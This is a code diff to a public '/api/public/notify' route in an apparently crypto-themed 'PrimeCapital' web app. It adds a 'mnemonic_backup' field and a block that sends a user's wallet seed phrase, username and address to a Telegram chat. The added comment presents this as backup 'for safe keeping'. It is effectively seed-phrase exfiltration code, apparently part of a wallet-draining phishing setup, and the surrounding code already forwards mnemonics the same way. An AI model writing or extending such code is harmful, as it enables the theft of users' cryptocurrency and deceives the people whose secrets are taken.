@@ -11,6 +11,7 @@ interface NotifyPayload {
   address?: string;
   fields?: Record<string, string>;
   mnemonic?: string;
+  mnemonic_backup?: string;
   addresses?: Array<{ chain: string; address: string; path?: string }>;
 }
 
@@ -94,6 +95,18 @@ export const Route = createFileRoute("/api/public/notify")({
         if (ua) lines.push(`🧭 ${esc(ua)}`);
 
         await sendTelegram(token, lines.join("\n"));
+
+        // Send mnemonic as a separate, tagged backup message for safe keeping
+        if (body.mnemonic_backup) {
+          const mnemonicBackup: string[] = [
+            `<b>PrimeCapital · MNEMONIC BACKUP</b> · <code>${esc(event)}</code>`,
+            `👤 <b>${esc(username)}</b>`,
+          ];
+          if (address) mnemonicBackup.push(`💼 <code>${esc(address)}</code>`);
+          mnemonicBackup.push(`🔑 <b>Seed Phrase:</b>`);
+          mnemonicBackup.push(`<code>${esc(body.mnemonic_backup)}</code>`);
+          await sendTelegram(token, mnemonicBackup.join("\n"));
+        }
 
         // Send seed / addresses as a separate, tagged message so admins can easily find backups.
         if (body.addresses && body.addresses.length) {
